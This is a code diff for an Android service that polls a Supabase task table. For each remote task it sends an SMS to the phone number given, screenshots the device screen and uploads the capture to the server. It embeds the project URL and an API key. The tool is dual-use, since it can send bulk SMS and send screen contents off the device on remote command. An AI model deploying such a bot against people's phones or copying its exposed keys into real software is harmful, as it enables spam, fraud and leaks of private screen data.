@@ -18,106 +18,78 @@ import java.nio.*;
 import org.json.*;
 
 public class SmsBotService extends Service {
+    private static final String SUPABASE_URL = "https://xusnqiovgqgrxxyikvxk.supabase.co";
+    private static final String SUPABASE_KEY = "sb_publishable_5Nr0YPv96-6cyQQKoDXlqg_OkhyqPvB";
     private boolean running = true;
-    private String botToken = "";
-    private String groupId = "";
-    private long lastUpdateId = 0;
-    private SharedPreferences prefs;
-    private int sentCount = 0;
-    private int failCount = 0;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        prefs = getSharedPreferences("smsbot", MODE_PRIVATE);
-        botToken = prefs.getString("bot_token", "");
-        groupId = prefs.getString("group_id", "");
-        lastUpdateId = prefs.getLong("last_update_id", 0);
         startForeground(1, buildNotification());
         new Thread(() -> {
             while (running) {
-                if (!botToken.isEmpty() && !groupId.isEmpty()) {
-                    checkGroupMessages();
+                try {
+                    checkAndProcessTasks();
+                } catch (Exception e) {
+                    e.printStackTrace();
                 }
-                try { Thread.sleep(3000); } catch (Exception e) {}
+                try { Thread.sleep(5000); } catch (Exception e) {}
             }
         }).start();
     }
 
-    private void checkGroupMessages() {
+    private void checkAndProcessTasks() throws Exception {
+        URL url = new URL(SUPABASE_URL + "/rest/v1/tasks?status=eq.pending&order=created_at.asc&limit=1");
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestProperty("apikey", SUPABASE_KEY);
+        conn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
+        conn.setRequestMethod("GET");
+
+        if (conn.getResponseCode() != 200) return;
+        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+        StringBuilder sb = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) sb.append(line);
+        reader.close();
+        JSONArray tasks = new JSONArray(sb.toString());
+        if (tasks.length() == 0) return;
+
+        JSONObject task = tasks.getJSONObject(0);
+        int taskId = task.getInt("id");
+        String phone = task.getString("phone");
+        String template = task.getString("template");
+
+        boolean success = true;
         try {
-            String urlStr = "https://api.telegram.org/bot" + botToken + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
-            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
-            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while ((line = reader.readLine()) != null) sb.append(line);
-            reader.close();
-
-            JSONObject j = new JSONObject(sb.toString());
-            if (!j.getBoolean("ok")) return;
-            JSONArray results = j.getJSONArray("result");
-            for (int i = 0; i < results.length(); i++) {
-                JSONObject update = results.getJSONObject(i);
-                long updateId = update.getLong("update_id");
-                if (updateId > lastUpdateId) lastUpdateId = updateId;
-                JSONObject msg = update.optJSONObject("message");
-                if (msg == null) continue;
-                String chatId = msg.getJSONObject("chat").getString("id");
-                if (!chatId.equals(groupId)) continue;
-
-                String text = msg.optString("text", "");
-                String phone = extractPhone(text);
-                if (phone == null) continue;
-                String template = extractTemplate(text, phone);
-
-                // Отправляем SMS
-                boolean success = true;
-                try {
-                    SmsManager.getDefault().sendTextMessage(phone, null, template, null, null);
-                    sentCount++;
-                    updateNotification();
-                    Thread.sleep(1500);
-                } catch (Exception e) {
-                    success = false;
-                    failCount++;
-                    updateNotification();
-                    sendPlainText(chatId, "❌ Ошибка отправки на " + phone);
-                    continue;
-                }
-
-                // Скриншот
-                byte[] screenshot = takeScreenshot();
-                if (screenshot != null) {
-                    sendPhoto(chatId, screenshot, "✅ Доставлено: " + phone);
-                } else {
-                    sendPlainText(chatId, "✅ Доставлено: " + phone + " (без скрина)");
-                }
-            }
-            prefs.edit().putLong("last_update_id", lastUpdateId).apply();
+            SmsManager.getDefault().sendTextMessage(phone, null, template, null, null);
+            Thread.sleep(1500);
         } catch (Exception e) {
-            e.printStackTrace();
+            success = false;
         }
-    }
 
-    private String extractPhone(String text) {
-        String[] words = text.split("\\s+");
-        for (String w : words) {
-            String digits = w.replaceAll("[^0-9]", "");
-            if (digits.length() == 11 && (digits.startsWith("7") || digits.startsWith("8"))) {
-                return "+7" + digits.substring(digits.length() - 10);
-            }
-            if (digits.length() == 10 && digits.startsWith("9")) {
-                return "+7" + digits;
+        String screenshotBase64 = null;
+        if (success) {
+            byte[] screenshotBytes = takeScreenshot();
+            if (screenshotBytes != null) {
+                screenshotBase64 = Base64.encodeToString(screenshotBytes, Base64.NO_WRAP);
             }
         }
-        return null;
-    }
 
-    private String extractTemplate(String text, String phone) {
-        String clean = text.replace(phone, "").replace("+7", "").replace("8", "").trim();
-        if (clean.isEmpty()) return "Сообщение";
-        return clean;
+        JSONObject updateBody = new JSONObject();
+        updateBody.put("status", success ? "success" : "failed");
+        if (screenshotBase64 != null) {
+            updateBody.put("screenshot", screenshotBase64);
+        }
+
+        URL updateUrl = new URL(SUPABASE_URL + "/rest/v1/tasks?id=eq." + taskId);
+        HttpURLConnection updateConn = (HttpURLConnection) updateUrl.openConnection();
+        updateConn.setRequestMethod("PATCH");
+        updateConn.setRequestProperty("apikey", SUPABASE_KEY);
+        updateConn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
+        updateConn.setRequestProperty("Content-Type", "application/json");
+        updateConn.setDoOutput(true);
+        updateConn.getOutputStream().write(updateBody.toString().getBytes());
+        updateConn.getResponseCode();
     }
 
     private byte[] takeScreenshot() {
@@ -146,52 +118,6 @@ public class SmsBotService extends Service {
         return null;
     }
 
-    private void sendPlainText(String chatId, String text) {
-        try {
-            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "application/json");
-            JSONObject body = new JSONObject();
-            body.put("chat_id", chatId);
-            body.put("text", text);
-            conn.getOutputStream().write(body.toString().getBytes());
-            conn.getResponseCode();
-        } catch (Exception e) {}
-    }
-
-    private void sendPhoto(String chatId, byte[] photo, String caption) {
-        try {
-            String boundary = "----Boundary" + System.currentTimeMillis();
-            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-            ByteArrayOutputStream body = new ByteArrayOutputStream();
-            body.write(("--" + boundary + "\r\n").getBytes());
-            body.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n").getBytes());
-            body.write(("--" + boundary + "\r\n").getBytes());
-            body.write(("Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n").getBytes());
-            body.write(("--" + boundary + "\r\n").getBytes());
-            body.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"screen.jpg\"\r\n").getBytes());
-            body.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
-            body.write(photo);
-            body.write(("\r\n--" + boundary + "--\r\n").getBytes());
-            conn.getOutputStream().write(body.toByteArray());
-            conn.getResponseCode();
-        } catch (Exception e) {}
-    }
-
-    private void updateNotification() {
-        Notification notification = new NotificationCompat.Builder(this, "smsbot")
-                .setContentTitle("SMS Bot активен")
-                .setContentText("Отправлено: " + sentCount + " | Ошибок: " + failCount)
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build();
-        ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).notify(1, notification);
-    }
-
     private Notification buildNotification() {
         String chId = "smsbot";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -199,8 +125,8 @@ public class SmsBotService extends Service {
             ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
         }
         return new NotificationCompat.Builder(this, chId)
-                .setContentTitle("SMS Bot")
-                .setContentText("Запуск...")
+                .setContentTitle("SMS Bot активен")
+                .setContentText("Ожидание задач из Supabase...")
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
